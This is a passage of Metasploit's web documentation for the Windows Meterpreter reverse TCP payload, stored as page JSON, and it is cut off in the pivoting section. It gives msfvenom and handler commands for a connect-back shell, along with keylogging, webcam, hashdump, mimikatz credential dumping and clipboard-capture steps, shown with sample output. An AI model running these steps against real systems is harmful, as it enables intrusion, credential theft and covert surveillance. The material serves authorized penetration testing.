{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/windows/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"9d4548f9-91fc-5741-a77f-263816a6483d","name":"Windows Meterpreter (Reflective Injection), Reverse TCP Stager","fullname":"payload/windows/meterpreter/reverse_tcp","description":"Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker","rank":300,"fields":{"detailsSlug":"/modules/details/payload/windows/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/windows/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/windows/meterpreter/reverse_tcp"},"documentation":{"html":"<p>windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has\nto offer, and there are so many things you can do with it.</p>\n<p>It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting,\ncontrol the webcam and microphone, etc. It has the best support for post modules, and you can\nload extensions, such as mimikatz and python interpreter, etc.</p>\n<p>windows/meterpreter/reverse_tcp is also the default payload for all Windows exploit targets.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This Meterpreter payload is suitable for the following environments:</p>\n<ul>\n<li>Windows x64</li>\n<li>Windows x86</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>windows/meterpreter/reverse_tcp is typically used in two different ways.</p>\n<p>First, it is typically used as a payload for an exploit. Here's how to do that:</p>\n<ol>\n<li>In msfconsole, select an exploit module</li>\n<li>Configure the options for that exploit.</li>\n<li>Do: <code class=\"language-text\">set payload windows/meterpreter/reverse_tcp</code></li>\n<li>Set the <code class=\"language-text\">LHOST</code> option, which is the IP that the payload should connect to.</li>\n<li>Do: <code class=\"language-text\">exploit</code>. If the exploit is successful, it should execute that payload.</li>\n</ol>\n<p>Another way to use windows/meterpreter/reverse_tcp is to generate it as an executable. Normally,\nyou would want to do it with msfvenom. If you are old school, you have probably also heard of\nmsfpayload and msfencode. msfvenom is a replacement of those.</p>\n<p>The following is a basic example of using msfvenom to generate windows/meterpreter/reverse_tcp\nas an executable:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o /tmp/payload.exe</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p><strong>pwd command</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command allows you to see the current directory you're in on the remote target.\nExample:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\nC:\\Users\\user\\Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd command</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd C:\\\\\nmeterpreter &gt; pwd\nC:\\</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>cat command</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat C:\\\\file.txt\nHello world!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload command</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/something.txt C:\\\\Users\\\\user\\\\Desktop\\\\something.txt\n[*] uploading  : /tmp/something.txt -&gt; C:\\Users\\user\\Desktop\\something.txt\n[*] uploaded   : /tmp/something.txt -&gt; C:\\Users\\user\\Desktop\\something.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The <code class=\"language-text\">-r</code> option for the command also allows you to upload recursively.</p>\n<p><strong>download command</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you download a file from the remote target to your machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download C:\\\\Users\\\\user\\\\Desktop\\\\something.txt /tmp/\n[*] downloading: C:\\Users\\user\\Desktop\\something.txt -&gt; /tmp//something.txt\n[*] download   : C:\\Users\\user\\Desktop\\something.txt -&gt; /tmp//something.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The <code class=\"language-text\">-r</code> option for the command also allows you to download recursively.</p>\n<p><strong>search command</strong></p>\n<p>The <code class=\"language-text\">search</code> command allows you to find files on the remote file system. For example, this\ndemonstrates how to find all text files in the current directory:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; search -d . -f *.txt\nFound 1 result...\n    .\\something.txt (5 bytes)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Note that without the <code class=\"language-text\">-d</code> option, the command will attempt to search in all drives.</p>\n<p>The <code class=\"language-text\">-r</code> option for the commands allows you to search recursively.</p>\n<p><strong>ifconfig command</strong></p>\n<p>The <code class=\"language-text\">ifconfig</code> command displays the network interfaces on the remote machine:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ifconfig\n\nInterface  1\n============\nName         : Software Loopback Interface 1\nHardware MAC : 00:00:00:00:00:00\nMTU          : 4294967295\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nIPv6 Address : ::1\nIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The command <code class=\"language-text\">ipconfig</code> is an alias for <code class=\"language-text\">ifconfig</code>.</p>\n<p><strong>getuid command</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command shows you the current user that the payload is running as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: WIN-6NH0Q8CJQVM\\user</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute command</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.</p>\n<p>The following example will spawn a calculator:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f calc.exe\nProcess 2076 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>To pass an argument, use the <code class=\"language-text\">-a</code> flag:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f iexplore.exe -a https://metasploit.com\nProcess 2016 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>There are some options you can see to add more stealth. For example, you can use the <code class=\"language-text\">-H</code> flag\nto create the process hidden from view. You can also use the <code class=\"language-text\">-m</code> flag to execute from memory.</p>\n<p><strong>ps command</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell command</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's command prompt. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 3576 created.\nChannel 6 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Users\\user\\Desktop&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To switch back to Meterpreter, do [CTRL]+[Z] to background the channel.</p>\n<p><strong>sysinfo command</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer        : WIN-6NH0Q8CJQVM\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x86\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>keyscan_start</strong></p>\n<p>The <code class=\"language-text\">keyscan_start</code> command starts the keylogging feature on the remote machine.</p>\n<p><strong>keyscan_dump</strong></p>\n<p>The <code class=\"language-text\">keyscan_dump</code> command is a keylogger feature. You must use the <code class=\"language-text\">keyscan_start</code> command\nbefore using this. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; keyscan_start\nStarting the keystroke sniffer...\nmeterpreter &gt; keyscan_dump\nDumping captured keystrokes...\nHello World!!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you wish to stop sniffing, use the <code class=\"language-text\">keyscan_stop</code> command.</p>\n<p><strong>keyscan_stop</strong></p>\n<p>The <code class=\"language-text\">keyscan_stop</code> command stops the keylogger.</p>\n<p><strong>screenshot</strong></p>\n<p>The <code class=\"language-text\">screenshot</code> command takes a screenshot of the target machine.</p>\n<p><strong>webcam_list</strong></p>\n<p>The <code class=\"language-text\">webcam_list</code> commands shows you a list of webcams that you can control. You'll\nprobably want to use this first before using any other webcam commands.</p>\n<p><strong>webcam_snap</strong></p>\n<p>The <code class=\"language-text\">webcam_snap</code> commands uses the selected webcam to take a picture.</p>\n<p><strong>webcam_stream</strong></p>\n<p>The <code class=\"language-text\">webcam_stream</code> command basically uses the <code class=\"language-text\">webcam_snap</code> command repeatedly to create\nthe streaming effect. There is no sound.</p>\n<p><strong>record_mic</strong></p>\n<p>The <code class=\"language-text\">record_mic</code> command captures audio on the remote machine.</p>\n<p><strong>getsystem</strong></p>\n<p>The <code class=\"language-text\">getsystem</code> command attempts to elevate your privilege on the remote machine with one of\nthese techniques:</p>\n<ul>\n<li>Named pipe impersonation (in memory)</li>\n<li>Named pipe impersonation (dropper)</li>\n<li>Token duplication (in memory)</li>\n</ul>\n<p>Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>hashdump</strong></p>\n<p>The <code class=\"language-text\">hashdump</code> commands allows you to dump the Windows hashes if there are the right privileges.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; hashdump\nAdministrator:500:e39baff0f2c5fd4e93e28745b8bf4ba6:f4974ee4a935ee160a927eafbb3f317f:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:92a84e332fa4b09e9850257ad6826566:8fb9a6e155fd6e14a16c37427b68bbb4:::\nroot:1003:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b205640421f2:::</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Setting up for Testing</strong></p>\n<p>For testing purposes, if you don't want to manually generate a payload and start a multi handler\nrepeatedly, you can use the auto<em>win32</em>multihandler.rc resource script in Metasploit to automate that process. Here's how you would use it:</p>\n<p>First, run the resource script:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ ./msfconsole -q -r scripts/resource/auto_win32_multihandler.rc\n[*] Processing scripts/resource/auto_win32_multihandler.rc for ERB directives.\n[*] resource (scripts/resource/auto_win32_multihandler.rc)&gt; Ruby Code (776 bytes)\nlhost =&gt; 192.168.1.199\nlport =&gt; 4444\n[*] Writing 73802 bytes to /Users/metasploit/.msf4/local/meterpreter_reverse_tcp.exe...\n[*] windows/meterpreter/reverse_tcp&#39;s LHOST=192.168.1.199, LPORT=4444\n[*] windows/meterpreter/reverse_tcp is at /Users/metasploit/.msf4/local/meterpreter_reverse_tcp.exe\npayload =&gt; windows/meterpreter/reverse_tcp\nlhost =&gt; 192.168.1.199\nlport =&gt; 4444\nexitonsession =&gt; false\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.1.199:4444\n[*] Starting the payload handler...\nmsf exploit(handler) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Next, go to your ~/.msf4/local directory, you should see meterpreter<em>reverse</em>tcp.exe in there.\nUpload that payload to your test box and execute it. You should receive a connection.</p>\n<p><strong>Using a Post Module</strong></p>\n<p>One of the best things about Meterpreter is you have access to a variety of post exploitation\nmodules, specifically for the multi and Windows categories. Post modules provide you with more capabilities to\ncollect data from the remote machine automatically. For example, you can steal passwords\nfrom popular applications and enumerate or modify system settings.</p>\n<p>To use a post module from the Meterpreter prompt, simply use the <code class=\"language-text\">run</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; run post/windows/gather/checkvm\n\n[*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....\n[*] This is a VMware Virtual Machine\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>It is also possible to run a post module via multiple Meterpreter sessions. To learn how, load\nthe specific post module you wish to run, and enter <code class=\"language-text\">info -d</code> to see the basic usage in the\ndocumentation.</p>\n<p><strong>Using the Mimikatz Extension</strong></p>\n<p><a href=\"https://github.com/gentilkiwi/mimikatz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Mimikatz</a> is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from memory on Windows. This might actually be the first thing you want to use as soon as you get a high-privileged session, such as SYSTEM.</p>\n<p>To begin, load the extension:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; load mimikatz\nLoading extension mimikatz...success.\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>This will create more commands for the Meterpreter prompt. Most of them are meant to be used to\nretrieve user names, hashes, passwords and other information:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Mimikatz Commands\n=================\n\n    Command           Description\n    -------           -----------\n    kerberos          Attempt to retrieve kerberos creds\n    livessp           Attempt to retrieve livessp creds\n    mimikatz_command  Run a custom command\n    msv               Attempt to retrieve msv creds (hashes)\n    ssp               Attempt to retrieve ssp creds\n    tspkg             Attempt to retrieve tspkg creds\n    wdigest           Attempt to retrieve wdigest creds</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>An example of using the <code class=\"language-text\">msv</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; msv\n[+] Running as SYSTEM\n[*] Retrieving msv credentials\nmsv credentials\n===============\n\nAuthID    Package    Domain           User              Password\n------    -------    ------           ----              --------\n0;313876  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }\n0;313828  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }\n0;996     Negotiate  WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)\n0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)\n0;45518   NTLM                                          n.s. (Credentials KO)\n0;999     NTLM       WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Using the extapi Extension</strong></p>\n<p>The main purpose of the extapi extension is to perform advanced enumeration of the target machine. For\nexample, you can enumerate things like registered services, open windows, clipboard, ADSI, WMI queries, etc.</p>\n<p>To begin, at the Meterpreter prompt, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; load extapi\nLoading extension extapi...success.\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>One great feature of the extension is clipboard management. The Windows clipboard is interesting\nbecause it can store anything that is sensitive, such as files, user names, and passwords, but it is not well protected.</p>\n<p>For example, a password manager is a popular tool to store encryped passwords. It allows the user\nto create complex passwords without the need to memorize any of them. All the user needs to do is\nopen the password manager, retrieve the password for a particular account by copying it, and then\npaste it on a login page.</p>\n<p>There is a security problem to the above process. When the user copies the password, it is stored\nin the operating system's clipboard. As an attacker, you can take advantage of this by starting the\nclipboard monitor from Meterpreter/extapi, and then collect whatever the user copies.</p>\n<p>To read whatever is currently stored in the target's clipboard, you can use the clipboard<em>get</em>data\ncommnad:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; clipboard_get_data\nText captured at 2016-03-05 19:13:39.0170\n=========================================\nhello, world!!\n=========================================\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The limitation of this command is that since you're only grabbing whatever is in the clipboard at\nthe time, there is only one item to collect. However, when you start a monitor, you can collect\nwhatever goes in there. To start, issue the following command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; clipboard_monitor_start\n[+] Clipboard monitor started\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>While it is monitoring, you can ask Meterpreter to dump whatever's been captured.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; clipboard_monitor_dump\nText captured at 2016-03-05 19:18:18.0466\n=========================================\nthis is fun.\n=========================================\n\nFiles captured at 2016-03-05 19:20:07.0525\n==========================================\nRemote Path : C:\\Users\\user\\Desktop\\cat_pic.png\nFile size   : 37627 bytes\ndownloading : C:\\Users\\user\\Desktop\\cat_pic.png -&gt; ./cat_pic.png\ndownload    : C:\\Users\\user\\Desktop\\cat_pic.png -&gt; ./cat_pic.png\n\n==========================================\n\n[+] Clipboard monitor dumped\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>The <code class=\"language-text\">clipboard_monitor_stop</code> command will also dump the captured data, and then exit.</p>\n<p>Combined with Meterpreter's keylogger, you have a very effective setup to capture the user's\ninputs.</p>\n<p><strong>Using the Python Extension</strong></p>\n<p>The Python extension allows you to use the remote machine's Python interpreter.</p>\n<p>To load the extension, at the Meterpreter prompt, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; use python\nLoading extension python...success.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The most basic example of using the interpreter is the <code class=\"language-text\">python_execute</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_execute &quot;x = &#39;hello world&#39;; print x&quot;\n[+] Content written to stdout:\nhello world\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Another way to execute Python code is from a local file by using the <code class=\"language-text\">python_import</code> command.</p>\n<p>To do this, first prepare for a Python script. This example should create a message.txt on the\nremote machine's desktop:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-python line-numbers\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n\nuser_profile <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">[</span><span class=\"token string\">'USERPROFILE'</span><span class=\"token punctuation\">]</span>\n\nf <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>user_profile <span class=\"token operator\">+</span> <span class=\"token string\">'\\\\Desktop\\\\message.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w+'</span><span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'hello world!'</span><span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And to run that with the command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; python_import -f /tmp/test.py\n[*] Importing /tmp/test.py ...\n[+] Command executed without returning a result\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To learn more about the Python extension, please read this <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Python-Extension\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">wiki</a>.</p>\n<p><strong>Network Pivoting</strong></p>\n<p>There are three mains ways that you can use for moving around inside a network:</p>\n<ul>\n<li>The route command in the msf prompt</li>\n<li>The route command in the the Meterpreter prompt</li>\n<li>The portfwd command</li>\n</ul>\n<p><strong><em>Routing through msfconsole</em></strong></p>\n<p>The route command from the msf prompt allows you connect to hosts on a different network through the compromised machine. You should be able to determine that by looking at the compromised machine's ipconfig:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre 